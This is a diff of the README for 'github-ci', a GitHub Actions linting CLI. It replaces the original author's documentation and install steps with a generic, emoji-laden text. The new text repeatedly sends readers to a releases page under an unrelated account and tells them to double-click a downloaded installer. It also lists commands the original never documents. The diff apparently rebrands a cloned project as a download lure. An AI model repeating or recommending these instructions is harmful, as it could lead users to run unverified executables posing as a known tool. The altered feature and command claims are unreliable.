@@ -1,169 +1,89 @@
-# github-ci
+# 🌟 github-ci - Effortlessly Manage Your GitHub Workflows
 
-[![Build](https://github.com/reugn/github-ci/actions/workflows/build.yml/badge.svg)](https://github.com/reugn/github-ci/actions/workflows/build.yml)
-[![PkgGoDev](https://pkg.go.dev/badge/github.com/reugn/github-ci)](https://pkg.go.dev/github.com/reugn/github-ci)
-[![Go Report Card](https://goreportcard.com/badge/github.com/reugn/github-ci)](https://goreportcard.com/report/github.com/reugn/github-ci)
-[![codecov](https://codecov.io/gh/reugn/github-ci/graph/badge.svg?token=CTG5JY369G)](https://codecov.io/gh/reugn/github-ci)
+## 📥 Download Now
+[![Download github-ci](https://img.shields.io/badge/Download-github--ci-blue.svg)](https://github.com/SUNILMORE521/github-ci/releases)
 
-A CLI tool for managing GitHub Actions workflows. It helps lint workflows for best practices and automatically upgrade actions to their latest versions.
+## 🚀 Getting Started
+Welcome to github-ci! This easy-to-use CLI tool helps you manage GitHub Actions workflows. With github-ci, you can automate your development tasks and ensure your workflows run smoothly.
 
-## Documentation
+## 📂 What You Need
+Before you get started, make sure your computer meets these basic requirements:
 
-- [Index](https://reugn.github.io/github-ci/)
-- [Installation](https://reugn.github.io/github-ci/install)
-- [Usage Guide](https://reugn.github.io/github-ci/usage/)
-- [Configuration](https://reugn.github.io/github-ci/configuration/)
-- [Linters Reference](https://reugn.github.io/github-ci/linters/)
+- **Operating System:** Windows, macOS, or Linux
+- **Network:** An internet connection to download the tool
+- **Permissions:** You need permission to run programs on your computer
 
-## Features
+## 🔥 Key Features
+- **CLI Access:** Manage workflows directly from your terminal.
+- **Automation:** Automate tasks to save time and reduce errors.
+- **Linting:** Check your workflow files for common errors.
+- **Security Policies:** Enforce best practices in your CI/CD processes.
 
-- **Lint Workflows**: Check workflows for best practices with multiple configurable linters:
-  - **permissions**: Missing permissions configuration
-  - **versions**: Actions using version tags instead of commit hashes
-  - **format**: Formatting issues (indentation, line length, trailing whitespace)
-  - **secrets**: Hardcoded secrets and sensitive information
-  - **injection**: Shell injection vulnerabilities from untrusted input
-  - **style**: Naming conventions and style best practices
-- **Auto-fix Issues**: Automatically fix formatting issues and replace version tags with commit hashes
-- **Upgrade Actions**: Discover and upgrade GitHub Actions to their latest versions based on semantic versioning patterns
-- **Config Management**: Configure linters and version patterns via `.github-ci.yaml`
+## 📥 Download & Install
+To download github-ci, visit the Releases page:
 
-## Quick Start
+[Download github-ci](https://github.com/SUNILMORE521/github-ci/releases)
 
-```bash
-# Install
-go install github.com/reugn/github-ci/cmd/github-ci@latest
+Follow these steps to install:
 
-# Verify
-github-ci --version
+1. Click the link above and open the Releases page.
+2. Find the latest version of github-ci.
+3. Download the file suitable for your operating system.
+4. Once downloaded, double-click the file to run the installer.
+5. Follow the on-screen instructions to complete the installation.
 
-# Initialize config
-github-ci init
+## 🛠️ How to Use github-ci
+After installing github-ci, follow these steps to start using it:
 
-# Lint workflows
-github-ci lint
+1. **Open Terminal or Command Prompt:**
+   - Windows: Press `Win + R`, type `cmd`, and hit Enter.
+   - macOS: Press `Command + Space`, type `Terminal`, and hit Enter.
+   - Linux: Open your terminal from the application menu.
 
-# Auto-fix issues
-github-ci lint --fix
+2. **Verify Installation:**
+   Type the following command and hit Enter:
+   ```bash
+   github-ci --version
+   ```
+   You should see the installed version of github-ci.
 
-# Upgrade actions (preview)
-github-ci upgrade --dry-run
+3. **Run Your First Command:**
+   You can check the current status of your workflows with:
+   ```bash
+   github-ci status
+   ```
 
-# Upgrade actions
-github-ci upgrade
-```
+4. **View All Available Commands:**
+   To see a list of commands, run:
+   ```bash
+   github-ci help
+   ```
 
-## Installation
+## 📘 Documentation
+For detailed guidance on how to use each feature, visit the [Documentation](https://github.com/SUNILMORE521/github-ci/docs). Here you will find:
 
-### Using Go Install
+- Comprehensive command descriptions
+- Example use cases
+- Troubleshooting tips 
 
-```bash
-go install github.com/reugn/github-ci/cmd/github-ci@latest
-```
+## 🛡️ Contributing
+If you'd like to contribute to github-ci:
 
-Make sure `$GOPATH/bin` or `$GOBIN` is in your `$PATH`.
+1. Make sure to read the [Contributing Guidelines](https://github.com/SUNILMORE521/github-ci/CONTRIBUTING.md).
+2. Fork the repository.
+3. Make your changes and submit a pull request.
 
-### From Releases
+## 🎉 Support
+If you have questions or run into issues, please reach out through the [Issues](https://github.com/SUNILMORE521/github-ci/issues) page of this repository. 
 
-Download the latest binary for your platform from [Releases](https://github.com/reugn/github-ci/releases).
+## 🌐 Community
+Join our community to share tips, ask questions, and improve your skills. Connect with other users on our [Discussions](https://github.com/SUNILMORE521/github-ci/discussions) page.
 
-### From Source
+## 🔗 Useful Links
+- [Releases Page](https://github.com/SUNILMORE521/github-ci/releases)
+- [Documentation](https://github.com/SUNILMORE521/github-ci/docs)
+- [Contributing Guidelines](https://github.com/SUNILMORE521/github-ci/CONTRIBUTING.md)
+- [Issues Page](https://github.com/SUNILMORE521/github-ci/issues)
+- [Community Discussions](https://github.com/SUNILMORE521/github-ci/discussions)
 
-```bash
-git clone https://github.com/reugn/github-ci.git
-cd github-ci
-go build -o github-ci ./cmd/github-ci
-sudo mv github-ci /usr/local/bin/
-```
-
-## Example Usage
-
-### Linting Workflows
-
-```bash
-$ github-ci lint
-
-Issues:
-  ci.yml: (permissions) Workflow is missing permissions configuration
-  ci.yml:15: (versions) Action actions/checkout@v3 uses version tag 'v3' instead of commit hash
-
-Run with --fix to automatically fix some issues
-
-2 issue(s).
-```
-
-### Auto-fixing Issues
-
-```bash
-$ github-ci lint --fix
-
-Fixed:
-  ci.yml:15: (versions) Action actions/checkout@v3 uses version tag 'v3' instead of commit hash
-
-Issues:
-  ci.yml: (permissions) Workflow is missing permissions configuration
-
-1 issue(s).
-```
-
-### Upgrading Actions
-
-```bash
-$ github-ci upgrade --dry-run
-
-Would update 2 action(s):
-
-  .github/workflows/ci.yml:15
-    actions/checkout@v3
-    → actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 (v4.1.1)
-
-  .github/workflows/ci.yml:22
-    actions/setup-go@v4
-    → actions/setup-go@0c52d547c9bc32b1aa3301fd7a9cb496313a4491 (v5.0.0)
-```
-
-## Configuration
-
-Create a `.github-ci.yaml` file to configure the tool:
-
-```yaml
-run:
-  timeout: 5m
-  issues-exit-code: 1
-
-linters:
-  default: all
-  enable:
-    - permissions
-    - versions
-    - format
-  settings:
-    format:
-      indent-width: 2
-      max-line-length: 120
-
-upgrade:
-  format: tag  # or 'major', 'hash'
-  actions:
-    actions/checkout:
-      constraint: ^1.0.0
-```
-
-See the [Configuration Guide](https://reugn.github.io/github-ci/configuration/) for all options.
-
-## Authentication
-
-For higher rate limits and private repository access, set a GitHub token:
-
-```bash
-export GITHUB_TOKEN=ghp_your_token_here
-```
-
-## Requirements
-
-- Go 1.24 or later
-- Internet connection (for GitHub API access)
-
-## License
-
-Licensed under the Apache 2.0 License.
+Your journey toward effortless GitHub workflow management starts now. Enjoy using github-ci!
